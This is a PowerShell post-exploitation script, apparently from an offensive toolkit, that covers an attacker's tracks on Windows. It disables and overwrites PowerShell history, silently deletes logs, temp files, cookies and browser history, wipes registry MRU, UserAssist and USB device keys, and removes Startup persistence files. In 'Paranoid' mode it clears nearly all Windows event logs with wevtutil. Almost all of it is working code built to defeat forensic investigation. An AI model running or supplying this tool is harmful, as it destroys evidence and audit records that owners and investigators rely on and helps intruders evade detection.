<#
.SYNOPSIS
   Cover tracks \ Clean artifacts {anti-forensic}

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: cmd.exe {native}
   Optional Dependencies: wevtutil {native}
   PS cmdlet Dev version: v1.0.9

.DESCRIPTION
   Module to clean artifacts that migth lead forensic investigatores to attacker steps.
   This Module will clean the most used locations and registry keys in HKCU hive. if the
   cmdlet its executed with administrator privileges and 'Paranoid' argument its invoked,
   then it also clears Eventvwr logiles + StartUp items + HKLM module-auto-sellected keys.

.NOTES
   Administrator privileges are required to clean eventvwr logfiles and HKLM hive.

.Parameter CleanTracks
   Accepts arguments: Clear and Paranoid (default: clear)

.Parameter Verb
   Print outputs in verbose mode? (default: false)

.EXAMPLE
   PS C:\> Get-Help .\CleanTracks.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Clear
   Clean Temp\Logs\Script artifacts left behind

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Paranoid
   Clean artifacts in paranoid mode (extensive cleanning)

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Paranoid -Verb True
   Clean artifacts in paranoid + verbose mode (print cleanned artifacts)

.OUTPUTS
   [-] Cover activity tracks on SKYNET
   [*] Token: Administrator privileges.
   [*] Cleaning: Multiple locations\Regedit.
   [-] Cleaning: Temporary folder artifacts.
       verbose : C:\Users\pedro\AppData\Local\Temp\Nsudo.exe
       verbose : C:\Users\pedro\AppData\Local\Temp\023fdRtTs.log
       verbose : C:\Users\pedro\AppData\Local\Temp\PSexecutionPolicy.bat
   [-] Cleaning: ConsoleHost_history records.
       verbose : nothing-to-see-here
   [-] Cleaning: StartUp directory artifacts.
       verbose : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persistence.vbs
   [-] Cleaning: Logfiles from Eventvwr snapin.
       verbose : Microsoft-Windows-Windows Defender/WHC
       verbose : Microsoft-Windows-AppModel-Runtime/Admin
       verbose : Microsoft-Windows-Websocket-Protocol-Component/Tracing

   Module      Date     ItemsDeleted ModifiedRegKeys ScriptsDeleted
   ----------- ----     ------------ --------------- --------------
   CleanTracks 22:17:29 1110         8               4
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$CleanTracks="false",
   [string]$Verb="false"
)


Write-Host "`n"
$ErrorActionPreference = "SilentlyContinue"
If($Verb -ieq "True"){$Char = "-"}Else{$Char = "*"}
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath
Write-Host "[-] Cover activity tracks on $Env:COMPUTERNAME" -ForegroundColor Green
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


If($IsClientAdmin -Match '^(True)$')
{
   Write-Host "[*] Token: Administrator privileges." -ForegroundColor Blue
}
Else
{
   Write-Host "[*] Token: UserLand shell privileges." -ForegroundColor Yellow
}


If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
{

   #Local function variable declarations
   $Count = 0       ## Items to delete counter
   $ModRegKey = 0   ## Reg keys to modify counter
   $MyArtifacts = 0 ## Scripts to delete counter
   $DateNow = Get-Date -Format 'HH:mm:ss' ## Time


   $ClearList = @(## Clear @arg
        "ipconfig /flushdns",
        "DEL /q /f %windir%\Temp\*.inf",
        "DEL /q /f /s %userprofile%\*.log",
        "DEL /q /f /s %userprofile%\*.tmp",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /ve /t REG_SZ /f'
     )

   $ParanoidList = @(## Paranoid @arg
        "ipconfig /flushdns",
        "DEL /q /f %windir%\*.tmp",
        "DEL /q /f %windir%\*.log",
        "DEL /q /f %windir%\Temp\*.inf",
        "DEL /q /f %windir%\system\*.tmp",
        "DEL /q /f %windir%\system\*.log",
        "DEL /q /f /s %userprofile%\*.tmp",
        "DEL /q /f /s %userprofile%\*.log",
        "DEL /q /f %windir%\system32\*.tmp",
        "DEL /q /f %windir%\system32\*.log",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
        "DEL /q /f /s %appdata%\Mozilla\Firefox\Profiles\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
        'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\*.tmp',
        'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\History\*.*',
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f',
        'REG DELETE "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f'
     )


   #Start Counting registry keys
   If($CleanTracks -ieq "Clear")
   {
      $ModRegKey = "4"
   }
   ElseIf($CleanTracks -ieq "Paranoid")
   {
      $ModRegKey = "6"   
   }


   If($IsClientAdmin -Match '^(True)$')
   {
      $ModRegKey = $ModRegKey+4
      #Add extra keys to list if cmdlet its executed with administrator privileges
      $ClearList += 'REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f'
      $ClearList += 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /ve /t REG_SZ /f'
      $ClearList += 'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v AlwaysUnloadDLL /t REG_SZ /d 1 /f'
      $ClearList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ClearList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'

      #Paranoid function list
      $ParanoidList += 'REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f'
      $ParanoidList += 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /ve /t REG_SZ /f'
      $ParanoidList += 'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v AlwaysUnloadDLL /t REG_SZ /d 1 /f'
      $ParanoidList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ParanoidList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
   }
   Else
   {
      $ModRegKey = $ModRegKey+2
      #Add to list the 'update desktop' rundll32 api + registry last key accessed
      $ClearList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ClearList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
      $ParanoidList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ParanoidList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
   }


   ## Loop trougth Array List {$ClearList + $ParanoidList}
   Write-Host "[*] Cleaning: Multiple locations\regedit." -ForegroundColor Blue
   If($CleanTracks -ieq "Clear")
   {
      ForEach($Item in $ClearList)
      {
         $Count++
         Start-Process -WindowStyle Hidden cmd.exe -ArgumentList "/R $Item"
      }
   }
   ElseIf($CleanTracks -ieq "Paranoid")
   {
      ForEach($Item in $ParanoidList)
      {
         $Count++
         Start-Process -WindowStyle Hidden cmd.exe -ArgumentList "/R $Item"
      }
   }


   #Delete all artifacts from %tmp% directory
   Write-Host "[$Char] Cleaning: Temporary folder artifacts." -ForegroundColor Blue;Start-Sleep -Milliseconds 300
   Get-ChildItem -Path "$Env:TMP\*" -Include *.exe,*.bat,*.vbs,*.hta,*.dll,*.inf,*.lnk,*.log,*.png,*.zip -Exclude *.ps1* -EA SilentlyContinue | ForEach-Object {
      Remove-Item -Path $_.FullName -Force|Out-Null
      If($?)
      {
         $MyArtifacts = $MyArtifacts+1
         If($Verb -ieq "True"){Write-Host "    verbose :"$_.FullName}
      }
      
   }


   #Clear PS Logging History
   If(-not($CleanPSLogging -ieq $null))
   {
      $Count = $Count+1
      echo "nothing-to-see-here"|Out-File "$CleanPSLogging" -Force
      Write-Host "[$Char] Cleaning: ConsoleHost_history records." -ForegroundColor Blue
      If($Verb -ieq "True"){Start-Sleep -Milliseconds 300;Write-Host "    verbose : nothing-to-see-where"}
   }


   If($CleanTracks -ieq "Paranoid")
   {

      <#
      .SYNOPSIS 
         Author: @r00t-3xp10it
         Helper - Delete ALL eventvwr logfiles + StartUp folder items.
      #>

      #Delete all artifacts from 'StartUp' directory
      Write-Host "[$Char] Cleaning: StartUp directory artifacts." -ForegroundColor Blue
      Start-Sleep -Milliseconds 300

      $PersistePath = "$Env:APPDATA\Microsoft\Windows" + "\Start Menu\Programs\" + "Startup\*" -join ''
      Get-ChildItem -Path "$PersistePath" -Include *.exe,*.bat,*.vbs,*.inf,*.hta,*.ps1 -EA SilentlyContinue | ForEach-Object {
         Remove-Item -Path $_.FullName -Force|Out-Null
         If($?)
         {
            $MyArtifacts = $MyArtifacts+1
            If($Verb -ieq "True"){Write-Host "    verbose :"$_.FullName}
         }
      }


      Write-Host "[$Char] Cleaning: Logfiles from Eventvwr snapin." -ForegroundColor Blue
      Start-Sleep -Milliseconds 300
      If($IsClientAdmin)
      {

         If($Verb -ieq "False")
         {
            Write-Host "    Warnning: Please wait while we clean Eventvwr." -ForegroundColor Yellow
         }


         $PSlist = wevtutil el | Where-Object {#Note: wevtutil cl => requires Administrator rigths to run
            $_ -iNotMatch '(Windows-Kernel|Windows-Crypto|Microsoft-Windows-LiveId/Analytic|Microsoft-Windows-LiveId/Operational|Microsoft-Windows-USBVideo/Analytic|/Admin)$'
         }
        
         ForEach($PSCategorie in $PSlist)
         {
            $Count = $Count+1
            wevtutil cl "$PSCategorie"|Out-Null
            If($Verb -ieq "True")
            {
               Write-Host "    verbose : $PSCategorie"
            }
         }

      }
      Else
      {
         Write-Host "    Warnning: Administrator privileges required." -ForegroundColor Yellow
      }

   }



   #Create Data Table for output onscreen
   $mytable = new-object System.Data.DataTable
   $mytable.Columns.Add("Module") | Out-Null
   $mytable.Columns.Add("Date") | Out-Null
   $mytable.Columns.Add("ItemsDeleted") | Out-Null
   $mytable.Columns.Add("ModifiedRegKeys") | Out-Null
   $mytable.Columns.Add("ScriptsDeleted") | Out-Null
   $mytable.Rows.Add("CleanTracks",
                     "$DateNow",
                     "$Count",
                     "$ModRegKey",
                     "$MyArtifacts") | Out-Null


   Write-Host "`n"
   #Display Table OnScreen
   $mytable | Format-Table -AutoSize | Out-String -Stream | Select -Skip 1 | ForEach-Object {
      $stringformat = If($_ -Match '^(Module)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }

}